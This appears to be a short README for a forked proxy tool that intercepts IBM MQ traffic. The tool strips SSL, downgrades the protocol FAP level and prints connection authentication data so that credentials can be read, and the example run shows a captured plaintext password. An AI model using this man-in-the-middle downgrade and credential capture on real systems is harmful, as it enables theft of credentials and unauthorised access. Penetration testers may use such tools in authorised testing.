Forked from https://github.com/dulaku/alsanna because all the main components already there
removed ssl stuff and added changing FAP level to 0c and outputing conauth data so you can see creds


exaple run below with the docker mq
mainframe@ubuntu:~/MYTOOLS/my_boyfriend$ sudo python3 my_boyfriend.py --listen_ip 0.0.0.0 --listen_port 1414 --server_ip 172.17.0.2 --server_port 1414 
b'CAUT\x01\x00\x00\x00\x05\x00\x00\x00\x08\x00\x00\x00\x05\x00\x00\x00\x08\x00\x00\x00adminpassw0rd\x00\x00\x00'


